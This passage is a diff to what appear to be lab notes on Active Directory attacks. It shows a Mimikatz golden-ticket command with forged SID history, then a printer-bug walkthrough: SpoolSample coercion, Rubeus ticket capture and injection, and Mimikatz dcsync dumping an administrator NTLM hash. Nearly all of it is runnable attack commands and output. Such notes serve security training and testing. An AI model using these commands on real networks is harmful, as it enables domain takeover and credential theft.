@@ -25,3 +25,30 @@ Now we are ready to craft the golden ticket that will grant us Enterprise Admin 
     kerberos::golden /user:h4x /domain:prod.corp1.com /sid:S-1-5-21-3776646582-2086779273-4091361643 /krbtgt:4b6af2bf64714682eeef64f516a08949 /sids:S-1-5-21-1095350385-1831131555-2412080359-519 /ptt
 
     c:\tools\SysinternalsSuite\PsExec.exe \\rdc01 cmd
+
+----------------------------------------------------------------
+
+2. Owning the Forest with Printers
+
+We can determine our access to the print spooler service on the rdc01 root domain controller -> 
+        ps> ls \\rdc01\pipe\spoolss
+
+use Rubeus to monitor for new tickets from the root domain controller machine account:
+        Rubeus.exe monitor /interval:5 /filteruser:RDC01$
+
+we'll switch back to our PowerShell prompt and launch SpoolSample to force the print change notification from rdc01
+        .\SpoolSample.exe rdc01.corp1.com appsrv01.prod.corp1.com
+
+Now we will reveive TGT on the terminal,  we can use Rubeus to inject it into memory
+
+        Rubeus.exe ptt /ticket:doIE9DCCBPCgAwIBBaEDAgEWooIEBDCCBABhggP8MIID+...
+
+The root domain controller computer account is not a local administrator on rdc01, so we cannot directly obtain code execution.
+We can exploit this by forcing a replication with Mimikatz dcsync:
+        lsadump::dcsync /domain:corp1.com /user:corp1\administrator
+        Credentials:
+          Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
+
+
+        
+
